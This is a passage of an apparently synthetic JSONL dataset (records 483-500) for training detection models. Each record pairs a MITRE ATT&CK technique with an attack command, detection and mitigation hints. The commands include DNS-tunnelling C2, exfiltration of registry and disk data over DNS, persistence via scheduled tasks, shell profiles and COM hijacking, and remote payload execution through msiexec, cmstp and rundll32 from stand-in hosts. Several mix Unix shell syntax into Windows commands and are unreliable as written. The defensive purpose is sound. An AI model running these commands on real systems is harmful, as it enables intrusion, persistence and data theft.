{"id":483,"tactic":"Persistence","technique":"T1053.005: Scheduled Task/Job","threat":"Using schtasks to create a scheduled task for DNS tunneling persistence.","command":"schtasks /create /tn $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /tr \"nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)\" /sc minute /mo 5 /f","detection":"Monitor scheduled tasks: `schtasks /query | findstr nslookup`; Event ID 4698.","mitigation":"Restrict schtasks: `icacls %windir%\\System32\\schtasks.exe /deny Everyone:RX`; Audit task creation: `auditpol /set /subcategory:'Security System Extension' /success:enable`.","references":["MITRE ATT&CK T1053.005: https://attack.mitre.org/techniques/T1053/005/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect schtasks-based DNS tunneling persistence by analyzing nslookup TXT queries, scheduled task configurations, and DNS traffic patterns; suggest task restrictions."}
{"id":484,"tactic":"Defense Evasion","technique":"T1218.001: Compiled HTML File","threat":"Using hh.exe to execute DNS tunneling CHM file via SMB share.","command":"hh \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com\\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).chm) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor hh SMB: `wmic process where name='hh.exe' get commandline | findstr \\\\`; YARA rule: `rule HhSmbDnsTunnel { strings: $a = /hh.*\\\\.*chm/ nocase; condition: $a }`.","mitigation":"Restrict hh: `icacls %windir%\\hh.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=out action=block protocol=TCP remoteport=445`.","references":["MITRE ATT&CK T1218.001: https://attack.mitre.org/techniques/T1218/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect hh.exe-based DNS tunneling CHM execution via SMB shares by analyzing SMB paths, hh command-line arguments, and DNS query patterns; suggest SMB restrictions."}
{"id":485,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using dig with NS records for DNS tunneling C2.","command":"dig +short NS $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig NS queries: `tcpdump -i any port 53 | grep NS`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect dig-based DNS tunneling with NS records by analyzing query patterns, base64-encoded subdomains, and NS record usage; suggest DNS inspection."}
{"id":486,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using PowerShell to exfiltrate registry keys via DNS SRV queries.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $reg = Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($reg)); Resolve-DnsName -Type SRV _$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)._tcp.$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor registry DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-ItemProperty`; DNS SRV spikes: `tshark -Y 'dns.qry.type == 33'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block SRV DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell registry key exfiltration via DNS SRV queries by analyzing base64-encoded subdomains, Get-ItemProperty execution, and DNS traffic patterns; suggest DNS filtering."}
{"id":487,"tactic":"Command and Control","technique":"T1572: Protocol Tunneling","threat":"Using ping with custom data for ICMP-based C2 tunneling.","command":"ping -c 4 -p $(echo c2cmd | xxd -p) $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com","detection":"Monitor ping ICMP: `tcpdump -i any icmp | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; Anomalous ICMP traffic: `tshark -Y 'icmp' | grep c2cmd`.","mitigation":"Restrict ping: `chmod 700 /bin/ping`; Block ICMP: `iptables -A OUTPUT -p icmp -j DROP`.","references":["MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect ICMP-based C2 tunneling via ping by analyzing custom packet data, ICMP traffic patterns, and base64-encoded payloads; suggest ICMP filtering."}
{"id":488,"tactic":"Persistence","technique":"T1546.004: Unix Shell Configuration Modification","threat":"Adding DNS tunneling script to bash_profile for persistence.","command":"echo \"nslookup -type=TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) > /dev/null\" >> ~/.bash_profile","detection":"Monitor bash_profile changes: `cat ~/.bash_profile | grep nslookup | grep TXT`; Audit file changes: `auditctl -w ~/.bash_profile -p wa`.","mitigation":"Restrict bash_profile writes: `chmod 600 ~/.bash_profile`; Monitor shell configuration changes.","references":["MITRE ATT&CK T1546.004: https://attack.mitre.org/techniques/T1546/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect DNS tunneling persistence in bash_profile by analyzing nslookup TXT commands, base64-encoded subdomains, and file modifications; suggest file protections."}
{"id":489,"tactic":"Defense Evasion","technique":"T1218.007: Msiexec","threat":"Using msiexec to install DNS tunneling MSI via SMB share.","command":"msiexec /quiet /i \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com\\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msi) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor msiexec SMB: `wmic process where name='msiexec.exe' get commandline | findstr \\\\`; YARA rule: `rule MsiexecSmbDnsTunnel { strings: $a = /msiexec.*\\\\.*msi/ nocase; condition: $a }`.","mitigation":"Restrict msiexec: `icacls %windir%\\System32\\msiexec.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=out action=block protocol=TCP remoteport=445`.","references":["MITRE ATT&CK T1218.007: https://attack.mitre.org/techniques/T1218/007/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect msiexec-based DNS tunneling MSI installations via SMB shares by analyzing SMB paths, msiexec command-line arguments, and DNS query patterns; suggest SMB restrictions."}
{"id":490,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using PowerShell to perform DNS tunneling with A records.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Resolve-DnsName -Type A $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor A queries: `tshark -Y 'dns.qry.type == 1' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; PowerShell DNS: `wmic process where name='powershell.exe' get commandline | findstr Resolve-DnsName`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block A DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect PowerShell DNS tunneling with A records by analyzing query patterns, base64-encoded subdomains, and A record usage; suggest DNS filtering."}
{"id":491,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using dig to exfiltrate system memory info via DNS TXT queries.","command":"dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(free -h | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig TXT queries: `tcpdump -i any port 53 | grep TXT`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect dig-based DNS exfiltration of system memory info via TXT queries by analyzing base64-encoded subdomains and DNS traffic anomalies; recommend DNS inspection."}
{"id":492,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using curl to communicate with GitHub API for C2.","command":"curl -H \"Authorization: Bearer $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 32)\" https://api.github.com/repos/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)/contents/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt -o /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt","detection":"Monitor curl GitHub: `ps aux | grep curl | grep api.github.com`; Network traffic: `tcpdump -i any host api.github.com`.","mitigation":"Restrict curl: `chmod 700 /usr/bin/curl`; Block GitHub API: `iptables -A OUTPUT -d api.github.com -j DROP`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect curl-based C2 via GitHub API by analyzing HTTP headers, GitHub API endpoints, and file creation patterns; recommend API blocking."}
{"id":493,"tactic":"Persistence","technique":"T1053.002: At (Linux)","threat":"Using at command for DNS tunneling persistence on Linux.","command":"echo \"dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) > /dev/null\" | at now + 5 minutes","detection":"Monitor at jobs: `atq | grep dig`; Audit file changes: `auditctl -w /var/spool/at -p wa`.","mitigation":"Restrict at: `chmod 700 /usr/bin/at`; Disable at daemon: `systemctl disable atd`.","references":["MITRE ATT&CK T1053.002: https://attack.mitre.org/techniques/T1053/002/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect at-based DNS tunneling persistence by analyzing dig TXT commands, at job configurations, and DNS query patterns; suggest at restrictions."}
{"id":494,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 with shdocvw.dll for DNS tunneling.","command":"rundll32 shdocvw.dll,OpenURL \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo nslookup -type=TXT $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor rundll32 shdocvw: `wmic process where name='rundll32.exe' get commandline | findstr shdocvw.dll`; YARA rule: `rule Rundll32ShdocvwDnsTunnel { strings: $a = /rundll32.*shdocvw.dll.*nslookup/ nocase; condition: $a }`.","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Block DNS queries: `netsh advfirewall firewall add rule name='Block rundll32 DNS' dir=out program='%windir%\\System32\\rundll32.exe' action=block`.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect rundll32 shdocvw.dll-based DNS tunneling by analyzing nslookup TXT queries, rundll32 command-line arguments, and DNS traffic patterns; suggest DNS restrictions."}
{"id":495,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using nslookup with SOA records for DNS tunneling C2.","command":"nslookup -type=SOA $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor SOA queries: `tshark -Y 'dns.qry.type == 6' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`; High DNS query volume: `netstat -an | findstr :53`.","mitigation":"Restrict nslookup: `icacls %windir%\\System32\\nslookup.exe /deny Everyone:RX`; Deploy DNS filtering: `netsh advfirewall firewall add rule name='Block Suspicious DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect DNS tunneling via nslookup SOA queries by analyzing query frequency, base64-encoded subdomains, and SOA record patterns; suggest DNS filtering."}
{"id":496,"tactic":"Exfiltration","technique":"T1048.003: Exfiltration Over Alternative Protocol","threat":"Using PowerShell to exfiltrate disk partitions via DNS CNAME queries.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $disk = Get-Disk | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($disk)); Resolve-DnsName -Type CNAME $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null\"","detection":"Monitor disk DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-Disk`; DNS CNAME spikes: `tshark -Y 'dns.qry.type == 5'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block CNAME DNS' dir=out action=block protocol=UDP remoteport=53`.","references":["MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect PowerShell disk partition exfiltration via DNS CNAME queries by analyzing base64-encoded subdomains, Get-Disk execution, and DNS traffic patterns; suggest DNS filtering."}
{"id":497,"tactic":"Command and Control","technique":"T1071.001: Application Layer Protocol: Web Protocols","threat":"Using Invoke-WebRequest for C2 via AWS API Gateway.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).execute-api.us-east-1.amazonaws.com/prod/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) -OutFile C:\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt\"","detection":"Monitor Invoke-WebRequest AWS: `wmic process where name='powershell.exe' get commandline | findstr execute-api`; Network traffic: `tshark -Y 'http.host contains execute-api.us-east-1.amazonaws.com'`.","mitigation":"Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block AWS API Gateway: `netsh advfirewall firewall add rule name='Block API Gateway' dir=out action=block remoteip=52.94.0.0/16`.","references":["MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect Invoke-WebRequest C2 via AWS API Gateway by analyzing HTTP requests, API Gateway URLs, and file creation patterns; recommend API blocking."}
{"id":498,"tactic":"Persistence","technique":"T1546.015: Component Object Model Hijacking","threat":"Hijacking COM object for DNS tunneling persistence with obfuscated CLSID.","command":"reg add HKLM\\Software\\Classes\\CLSID\\{$(cat /dev/urandom | tr -dc 'A-F0-9' | head -c 8)-$(cat /dev/urandom | tr -dc 'A-F0-9' | head -c 4)-$(cat /dev/urandom | tr -dc 'A-F0-9' | head -c 4)-$(cat /dev/urandom | tr -dc 'A-F0-9' | head -c 4)-$(cat /dev/urandom | tr -dc 'A-F0-9' | head -c 12)} /v InprocServer32 /t REG_SZ /d \"C:\\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\" /f","detection":"Monitor COM registry: `reg query HKLM\\Software\\Classes\\CLSID | findstr dnstunnel`; Event ID 4657.","mitigation":"Restrict COM writes: `regini -h deny HKLM\\Software\\Classes\\CLSID`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1546.015: https://attack.mitre.org/techniques/T1546/015/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect COM hijacking for DNS tunneling persistence by analyzing CLSID registry changes, DLL paths, and DNS query patterns; suggest registry protections."}
{"id":499,"tactic":"Defense Evasion","technique":"T1218.003: CMSTP","threat":"Using cmstp to execute DNS tunneling INF via SMB share.","command":"cmstp /ni /s \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com\\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor cmstp SMB: `wmic process where name='cmstp.exe' get commandline | findstr \\\\`; YARA rule: `rule CmstpSmbDnsTunnel { strings: $a = /cmstp.*\\\\.*inf/ nocase; condition: $a }`.","mitigation":"Restrict cmstp: `icacls %windir%\\System32\\cmstp.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=out action=block protocol=TCP remoteport=445`.","references":["MITRE ATT&CK T1218.003: https://attack.mitre.org/techniques/T1218/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect cmstp-based DNS tunneling INF execution via SMB shares by analyzing SMB paths, cmstp command-line arguments, and DNS query patterns; suggest SMB restrictions."}
{"id":500,"tactic":"Command and Control","technique":"T1071.004: Application Layer Protocol: DNS","threat":"Using dig with PTR records for DNS tunneling C2.","command":"dig +short PTR $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)","detection":"Monitor dig PTR queries: `tcpdump -i any port 53 | grep PTR`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.","mitigation":"Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.","references":["MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/","CWE-319: https://cwe.mitre.org/data/definitions/319.html"],"ai_training_prompt":"Train AI to detect dig-based DNS tunneling with PTR records by analyzing query patterns, base64-encoded subdomains, and PTR record usage; suggest DNS inspection."}